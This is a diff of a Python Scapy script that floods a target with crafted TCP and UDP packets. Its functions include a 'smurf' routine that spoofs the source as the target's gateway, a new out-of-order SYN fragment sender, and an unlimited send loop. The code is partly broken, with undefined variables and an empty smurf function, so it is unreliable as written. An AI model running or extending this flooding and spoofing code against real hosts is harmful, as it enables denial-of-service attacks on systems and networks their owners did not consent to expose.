@@ -28,24 +28,25 @@ def sendTCP(d, p):
     for x in range (0, len(flags)):
         a=IP(dst=d)/TCP(flags=flags[x], sport=RandShort(), dport=p)
     send(a, verbose=0) #transmit packet
-    end
+
 
 def sendUDP(d, p):
     a=IP(dst=d)/UDP(sport=RandShort(), dport=p)
+    send(a, verbose=0)
 
 def spoofIP(i):
     #return the gateway of provided IP..~~
     return b
 
 def sendSMURF(d, p):
+    print("tralalala~ smurf -->\r\n")
     s=spoofIP(d)
-    a1=IP(dst=d,src=s)/TCP(flags="S", sport=RandShort(), dport=p)
-    send(a1)
-    #need a function here to get the sequence no.
-    #sq=int(functionToGetSequenceNo)
-    sq=5
-    a2=IP(dst=d,src=s)/TCP(flags="S", sport=RandShort(), dport=p, ack=sq+1, seq=1)
-    send(a2)
+    
+def sendFRAG(d, p):
+    sekvens=[1,2,4,3,6,5,8,7,10,9]
+    for x in range (0, len(sekvens)):
+        a=IP(dst=d,src=s)/TCP(flags="S", sport=RandShort(), dport=p,seq=sekvens[x])
+        send(a)
 
 def sendAPT(d, p):
     #ip2b 8bit + 4bit + 5bit
@@ -58,7 +59,7 @@ def sendAPT(d, p):
         send(a, verbose=0)
 
 
-if args['count'] == "X" or args['count'] == "x": # If the user entered an X or x into the count argument (wants unlimited SYN segments sent)
+if args['count'] == "X" or args['count'] == "x": #x marks the spot
     while (1 == 1):
         sendTCP(args['source'], int(args['port']))
         i = i + 1
